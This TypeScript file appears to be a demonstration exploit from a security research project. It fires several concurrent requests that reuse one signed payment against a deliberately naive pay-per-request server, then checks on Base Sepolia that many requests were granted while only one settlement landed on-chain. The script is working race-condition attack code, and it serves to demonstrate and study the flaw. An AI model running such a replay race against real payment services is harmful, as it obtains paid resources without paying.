/**
 * Live settlement race against Base Sepolia.
 *
 * Sign one payment, fire N concurrent requests carrying it. The naive server
 * grants every one (they all verify against an unconsumed nonce before any
 * settles), while only a single settlement lands on-chain. The real block
 * inclusion latency is the race window; nothing here is faked.
 *
 * Run the naive server first (npm run server), then: npm run attack:race
 */
import { obtainPaymentHeader } from "../pay.js";

const BASE = process.env.SERVER_URL ?? "http://localhost:4021";
const RESOURCE = `${BASE}/report`;
const CONCURRENCY = Number(process.env.CONCURRENCY ?? "5");

type Stats = { granted: number; settled: { ok: boolean; transaction?: string; reason?: string }[] };

async function stats(): Promise<Stats> {
  return (await fetch(`${BASE}/__stats`)).json() as Promise<Stats>;
}

async function main(): Promise<void> {
  const header = await obtainPaymentHeader(RESOURCE);

  const responses = await Promise.all(
    Array.from({ length: CONCURRENCY }, () => fetch(RESOURCE, { headers: header })),
  );
  const granted = responses.filter((r) => r.status === 200).length;
  console.log(`granted ${granted}/${CONCURRENCY} concurrent requests for one payment`);

  // Wait for all settlements to resolve on-chain.
  for (let i = 0; i < 15; i++) {
    const s = await stats();
    if (s.settled.length >= CONCURRENCY) {
      break;
    }
    await new Promise((r) => setTimeout(r, 2000));
  }

  const s = await stats();
  const settledOk = s.settled.filter((o) => o.ok);
  console.log(`settled on-chain: ${settledOk.length} of ${s.settled.length} attempts`);
  for (const o of settledOk) {
    console.log(`  https://sepolia.basescan.org/tx/${o.transaction}`);
  }

  const landed = granted > settledOk.length && settledOk.length === 1;
  console.log(landed ? "race landed: many grants, one settlement" : "race did NOT reproduce");
  if (!landed) {
    process.exitCode = 1;
  }
}

main().catch((error: unknown) => {
  console.error(error);
  process.exitCode = 1;
});
